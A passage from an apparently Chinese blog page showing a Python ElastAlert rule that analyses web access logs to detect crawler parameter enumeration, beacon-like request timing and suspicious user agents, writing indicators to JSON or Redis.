class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, JoinableQueue, Lock, Manager</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> elastalert.ruletypes <span class="keyword">import</span> RuleType</span><br><span class="line"><span class="keyword">from</span> elastalert.util <span class="keyword">import</span> elastalert_logger</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please make sure you have pandas installed. pip install pandas&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please make sure you have tqdm module installed. pip install tqdm&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">6379</span>, password=<span class="literal">None</span>, db=<span class="number">0</span></span>):</span></span><br><span class="line">    pool = redis.ConnectionPool(host=host, port=port, password=password, db=db)</span><br><span class="line">    conn = redis.Redis(connection_pool=pool)</span><br><span class="line">    <span class="keyword">return</span> conn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put_data</span>(<span class="params">conn, q, data</span>):</span></span><br><span class="line">    <span class="keyword">with</span> conn.pipeline() <span class="keyword">as</span> pipe:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            pipe.lpush(q, i)</span><br><span class="line">        pipe.execute()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpiderRule</span>(<span class="params">RuleType</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rules, args=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(SpiderRule, self).__init__(rules, args=<span class="literal">None</span>)</span><br><span class="line">        self.MAX_ARGS_LENGTH = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;max_args_length&#x27;</span>])</span><br><span class="line">        self.MIN_HITS = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;min_hits&#x27;</span>])</span><br><span class="line">        self.MAX_UNIQUE_ARGS = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;max_unique_args&#x27;</span>])</span><br><span class="line">        self.THRESHOLD_PERCENT = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;threshold_percent&#x27;</span>])</span><br><span class="line">        self.NUM_PROCESSES = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;threads&#x27;</span>])</span><br><span class="line">        self.UA_PROCESSES = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;user_agent&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        self.TIMESTAMP = <span class="string">&#x27;@timestamp&#x27;</span></span><br><span class="line">        self.FORMAT_TIMESTAMP = self.rules[<span class="string">&#x27;timestamp&#x27;</span>].get(<span class="string">&#x27;format&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        self.beacon_module = self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;beacon_module&#x27;</span>]</span><br><span class="line">        self.WINDOW = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;window&#x27;</span>])</span><br><span class="line">        self.MIN_INTERVAL = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;min_interval&#x27;</span>])</span><br><span class="line">        buffer_time = <span class="built_in">str</span>(self.rules[<span class="string">&#x27;buffer_time&#x27;</span>])</span><br><span class="line">        self.PERIOD = <span class="string">&#x27;:&#x27;</span>.join(buffer_time.split(<span class="string">&#x27;:&#x27;</span>)[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        self.fields = self.normalized_field(self.rules[<span class="string">&#x27;field&#x27;</span>])</span><br><span class="line">        self.src_ip = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;src_ip&#x27;</span>]</span><br><span class="line">        self.url = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">        self.url_path = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;url_path&#x27;</span>]</span><br><span class="line">        self.http_host = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;http_host&#x27;</span>]</span><br><span class="line">        self.user_agent = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;user_agent&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        self.json = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;json&#x27;</span>].get(<span class="string">&#x27;enable&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        self.redis = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>].get(<span class="string">&#x27;enable&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        self.q_job = JoinableQueue()</span><br><span class="line">        self.l_df = Lock()</span><br><span class="line">        self.l_list = Lock()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">normalized_field</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        fields = &#123;<span class="string">&#x27;hash&#x27;</span>: [], <span class="string">&#x27;output&#x27;</span>: [], <span class="string">&#x27;aliases&#x27;</span>: &#123;&#125;&#125;</span><br><span class="line">        <span class="keyword">for</span> field, info <span class="keyword">in</span> d.items():</span><br><span class="line">            alias = info[<span class="string">&#x27;alias&#x27;</span>]</span><br><span class="line">            fields[<span class="string">&#x27;aliases&#x27;</span>][alias] = field</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> info.get(<span class="string">&#x27;type&#x27;</span>, []):</span><br><span class="line">                fields[i].append(field)</span><br><span class="line">        <span class="keyword">return</span> fields</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_data</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment"># Detection of spider crawlers</span></span><br><span class="line">        self.df = pd.json_normalize(data)</span><br><span class="line">        results = self.find_spiders()</span><br><span class="line"></span><br><span class="line">        d = results.to_dict(orient=<span class="string">&quot;records&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Output to local files</span></span><br><span class="line">        <span class="keyword">if</span> self.json:</span><br><span class="line">            json_path = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;json&#x27;</span>][<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(json_path, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> out_file:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">                    out_file.write(json.dumps(i) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Output to Redis Server</span></span><br><span class="line">        <span class="keyword">if</span> self.redis:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                host = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;host&#x27;</span>]</span><br><span class="line">                port = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;port&#x27;</span>]</span><br><span class="line">                password = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">                db = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;db&#x27;</span>]</span><br><span class="line">                key = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">                ioc = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;field&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                redis_conn = conn(host=host, port=port,</span><br><span class="line">                                  password=password, db=db)</span><br><span class="line">                IoC = results[ioc].unique().tolist()</span><br><span class="line">                put_data(redis_conn, key, IoC)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                elastalert_logger.error(<span class="string">&quot;Output Redis configuration errors.&quot;</span>)</span><br><span class="line">        self.add_match(d)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The results of get_match_str will appear in the alert text</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_match_str</span>(<span class="params">self, match</span>):</span></span><br><span class="line">        <span class="keyword">return</span> json.dumps(match)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_match</span>(<span class="params">self, results</span>):</span></span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">            <span class="built_in">super</span>(SpiderRule, self).add_match(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_args_hash</span>(<span class="params">self, args, session_id</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>(<span class="built_in">tuple</span>(args + [session_id]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_query_str</span>(<span class="params">self, request</span>):</span></span><br><span class="line">        query = request.split(<span class="string">&#x27;?&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        query_str = <span class="built_in">dict</span>([i.split(<span class="string">&quot;=&quot;</span>, <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> query.split(</span><br><span class="line">            <span class="string">&quot;&amp;&quot;</span>) <span class="keyword">if</span> i <span class="keyword">if</span> <span class="built_in">len</span>(i.split(<span class="string">&quot;=&quot;</span>, <span class="number">1</span>)) == <span class="number">2</span>])</span><br><span class="line">        query_str[<span class="string">&#x27;args_list&#x27;</span>] = <span class="built_in">list</span>(query_str.keys())</span><br><span class="line">        query_str[<span class="string">&#x27;max_length&#x27;</span>] = <span class="built_in">len</span>(query_str)</span><br><span class="line">        query_str[<span class="string">&#x27;url_sample&#x27;</span>] = request</span><br><span class="line">        <span class="keyword">return</span> query_str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">percent_grouping</span>(<span class="params">self, d, total</span>):</span></span><br><span class="line">        interval = <span class="number">0</span></span><br><span class="line">        <span class="comment"># Finding the key with the largest value (interval with most events)</span></span><br><span class="line">        mx_key = <span class="built_in">int</span>(<span class="built_in">max</span>(<span class="built_in">iter</span>(<span class="built_in">list</span>(d.keys())), key=(<span class="keyword">lambda</span> key: d[key])))</span><br><span class="line">        mx_percent = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(mx_key - self.WINDOW, mx_key + <span class="number">1</span>):</span><br><span class="line">            current = <span class="number">0</span></span><br><span class="line">            <span class="comment"># Finding center of current window</span></span><br><span class="line">            curr_interval = i + <span class="built_in">int</span>(self.WINDOW / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, i + self.WINDOW):</span><br><span class="line">                <span class="keyword">if</span> j <span class="keyword">in</span> d:</span><br><span class="line">                    current += d[j]</span><br><span class="line"></span><br><span class="line">            percent = <span class="built_in">float</span>(current) / total * <span class="number">100</span></span><br><span class="line">            <span class="keyword">if</span> percent &gt; mx_percent:</span><br><span class="line">                mx_percent = percent</span><br><span class="line">                interval = curr_interval</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> interval, mx_percent</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_beacon</span>(<span class="params">self, session_data</span>):</span></span><br><span class="line">        beacon = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.FORMAT_TIMESTAMP:</span><br><span class="line">            session_data[self.TIMESTAMP] = pd.to_datetime(</span><br><span class="line">                session_data[self.TIMESTAMP])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session_data[self.TIMESTAMP] = pd.to_datetime(</span><br><span class="line">                session_data[self.TIMESTAMP], <span class="built_in">format</span>=self.FORMAT_TIMESTAMP)</span><br><span class="line">        session_data[self.TIMESTAMP] = (</span><br><span class="line">            session_data[self.TIMESTAMP].astype(<span class="built_in">int</span>) / <span class="number">1000000000</span>).astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">        session_data = session_data.sort_values([self.TIMESTAMP])</span><br><span class="line">        session_data[<span class="string">&#x27;delta&#x27;</span>] = (</span><br><span class="line">            session_data[self.TIMESTAMP] - session_data[self.TIMESTAMP].shift()).fillna(<span class="number">0</span>)</span><br><span class="line">        session_data = session_data[<span class="number">1</span>:]</span><br><span class="line">        d = <span class="built_in">dict</span>(session_data.delta.value_counts())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">list</span>(d.keys()):</span><br><span class="line">            <span class="keyword">if</span> key &lt; self.MIN_INTERVAL:</span><br><span class="line">                <span class="keyword">del</span> d[key]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Finding the total number of events</span></span><br><span class="line">        total = <span class="built_in">sum</span>(d.values())</span><br><span class="line">        <span class="keyword">if</span> d <span class="keyword">and</span> total &gt; self.MIN_HITS:</span><br><span class="line">            window, percent = self.percent_grouping(d, total)</span><br><span class="line">            <span class="keyword">if</span> percent &gt; self.THRESHOLD_PERCENT <span class="keyword">and</span> total &gt; self.MIN_HITS:</span><br><span class="line">                beacon = &#123;</span><br><span class="line">                    <span class="string">&#x27;percent&#x27;</span>: <span class="built_in">int</span>(percent),</span><br><span class="line">                    <span class="string">&#x27;interval&#x27;</span>: <span class="built_in">int</span>(window),</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> beacon</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_spider</span>(<span class="params">self, q_job, spider_list</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> q_job.empty():</span><br><span class="line">            session_id = q_job.get()</span><br><span class="line">            self.l_df.acquire()</span><br><span class="line">            session_data = self.df[self.df[<span class="string">&#x27;session_id&#x27;</span>]</span><br><span class="line">                                   == session_id]</span><br><span class="line">            self.l_df.release()</span><br><span class="line"></span><br><span class="line">            query_str = session_data[self.url].apply(</span><br><span class="line">                <span class="keyword">lambda</span> req: self.get_query_str(req)).tolist()</span><br><span class="line">            query_data = pd.DataFrame(query_str)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># get args_hash</span></span><br><span class="line">            query_data[<span class="string">&#x27;args_hash&#x27;</span>] = query_data[<span class="string">&#x27;args_list&#x27;</span>].apply(</span><br><span class="line">                <span class="keyword">lambda</span> args: self.get_args_hash(args, session_id))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> query_data[<span class="string">&#x27;args_hash&#x27;</span>].unique():</span><br><span class="line">                result = &#123;</span><br><span class="line">                    <span class="string">&quot;detail&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&#x27;percent&#x27;</span>: &#123;&#125;,</span><br><span class="line">                        <span class="string">&#x27;unique&#x27;</span>: &#123;&#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;tags&quot;</span>: [],</span><br><span class="line">                    <span class="string">&quot;src_ip&quot;</span>: session_data[self.src_ip].tolist()[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">&quot;url_path&quot;</span>: session_data[self.url_path].tolist()[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">&quot;http_host&quot;</span>: session_data[self.http_host].tolist()[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">&quot;unique_ua&quot;</span>: session_data[self.user_agent].unique().shape[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">&quot;alert&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                df = query_data[query_data[<span class="string">&#x27;args_hash&#x27;</span>] == i]</span><br><span class="line">                count_args_length = df[<span class="string">&#x27;max_length&#x27;</span>].iloc[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> count_args_length &gt; self.MAX_ARGS_LENGTH:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                total_hits = df.shape[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> total_hits &lt; self.MIN_HITS:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                args_list = df[<span class="string">&#x27;args_list&#x27;</span>].iloc[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> args_list:</span><br><span class="line">                    unique_args = <span class="built_in">len</span>(df[i].unique())</span><br><span class="line">                    <span class="keyword">if</span> unique_args == <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Calculate the percentage based on the number of changes in the parameters</span></span><br><span class="line">                    current_percent = <span class="built_in">int</span>((unique_args / total_hits) * <span class="number">100</span>)</span><br><span class="line">                    <span class="keyword">if</span> current_percent &lt; self.THRESHOLD_PERCENT:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    result[<span class="string">&#x27;detail&#x27;</span>][<span class="string">&#x27;percent&#x27;</span>][i] = current_percent</span><br><span class="line">                    result[<span class="string">&#x27;detail&#x27;</span>][<span class="string">&#x27;unique&#x27;</span>][i] = unique_args</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Number of parameters with changes</span></span><br><span class="line">                    count_unique_args = <span class="built_in">len</span>(result[<span class="string">&#x27;detail&#x27;</span>][<span class="string">&#x27;unique&#x27;</span>])</span><br><span class="line">                    <span class="keyword">if</span> count_unique_args &lt;= self.MAX_UNIQUE_ARGS:</span><br><span class="line">                        result[<span class="string">&#x27;alert&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> result[<span class="string">&#x27;detail&#x27;</span>][<span class="string">&#x27;unique&#x27;</span>]:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Beacon analysis</span></span><br><span class="line">                <span class="keyword">if</span> self.beacon_module:</span><br><span class="line">                    result[<span class="string">&#x27;beacon&#x27;</span>] = self.find_beacon(</span><br><span class="line">                        session_data.reset_index(drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;args_list&#x27;</span>] = args_list</span><br><span class="line">                result[<span class="string">&#x27;total_hits&#x27;</span>] = total_hits</span><br><span class="line">                result[<span class="string">&#x27;url_sample&#x27;</span>] = df[<span class="string">&#x27;url_sample&#x27;</span>].iloc[<span class="number">0</span>]</span><br><span class="line">                result[<span class="string">&#x27;period&#x27;</span>] = self.PERIOD</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">&#x27;alert&#x27;</span>]:</span><br><span class="line">                    result[<span class="string">&#x27;tags&#x27;</span>].append(<span class="string">&#x27;enumerate&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">&#x27;beacon&#x27;</span>]:</span><br><span class="line">                    result[<span class="string">&#x27;tags&#x27;</span>].append(<span class="string">&#x27;beacon&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">&#x27;unique_ua&#x27;</span>] &gt;= self.UA_PROCESSES:</span><br><span class="line">                    result[<span class="string">&#x27;tags&#x27;</span>].append(<span class="string">&#x27;suspicious-ua&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                self.l_list.acquire()</span><br><span class="line">                spider_list.append(result)</span><br><span class="line">                self.l_list.release()</span><br><span class="line">            q_job.task_done()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_spiders</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.df.empty:</span><br><span class="line">            <span class="keyword">raise</span> Exception(</span><br><span class="line">                <span class="string">&quot;Elasticsearch did not retrieve any data. Please ensure your settings are correct inside the config file.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        tqdm.pandas(desc=<span class="string">&quot;Detection of Spider Crawlers.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get url_path</span></span><br><span class="line">        self.df[self.url_path] = self.df[self.url].<span class="built_in">str</span>.split(<span class="string">&#x27;?&#x27;</span>).<span class="built_in">str</span>.get(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add session_id from hash fields</span></span><br><span class="line">        self.df[<span class="string">&#x27;session_id&#x27;</span>] = self.df[self.fields[<span class="string">&#x27;hash&#x27;</span>]</span><br><span class="line">                                        ].progress_apply(<span class="keyword">lambda</span> row: <span class="built_in">hash</span>(<span class="built_in">tuple</span>(row)), axis=<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># split url</span></span><br><span class="line">        self.df = self.df[self.df[self.url].apply(<span class="keyword">lambda</span> request: <span class="literal">True</span> <span class="keyword">if</span> <span class="built_in">len</span>(</span><br><span class="line">            request.split(<span class="string">&#x27;?&#x27;</span>)) == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span>)].reset_index(drop=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># normalized url</span></span><br><span class="line">        self.df[self.url] = self.df[self.url].apply(</span><br><span class="line">            <span class="keyword">lambda</span> request: html.unescape(request))</span><br><span class="line">        <span class="comment"># unique session_id</span></span><br><span class="line">        unique_session = self.df[<span class="string">&#x27;session_id&#x27;</span>].unique()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> session <span class="keyword">in</span> unique_session:</span><br><span class="line">            self.q_job.put(session)</span><br><span class="line"></span><br><span class="line">        mgr = Manager()</span><br><span class="line">        spider_list = mgr.<span class="built_in">list</span>()</span><br><span class="line">        processes = [Process(target=self.find_spider, args=(</span><br><span class="line">            self.q_job, spider_list,)) <span class="keyword">for</span> thread <span class="keyword">in</span> <span class="built_in">range</span>(self.NUM_PROCESSES)]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Run processes</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">            p.start()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Exit the completed processes</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">            p.join()</span><br><span class="line"></span><br><span class="line">        results = pd.DataFrame(<span class="built_in">list</span>(spider_list))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add timestamp</span></span><br><span class="line">        now = datetime.datetime.now().isoformat()</span><br><span class="line">        results[<span class="string">&#x27;timestamp&#x27;</span>] = now</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> results.empty:</span><br><span class="line">            results = results[results[<span class="string">&#x27;alert&#x27;</span>] == <span class="literal">True</span>]</span><br><span class="line"></span><br><span class="line">        match_log = <span class="string">&quot;Queried rule %s matches %s crawl events&quot;</span> % (</span><br><span class="line">            self.rules[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">            results.shape[<span class="number">0</span>]</span><br><span class="line">        )</span><br><span class="line">        elastalert_logger.info(match_log)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> results</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><ul>
<li><h6 id="Web-yaml"><a href="#Web-yaml" class="headerlink" title="Web.yaml"></a>Web.yaml</h6></li>
</ul>
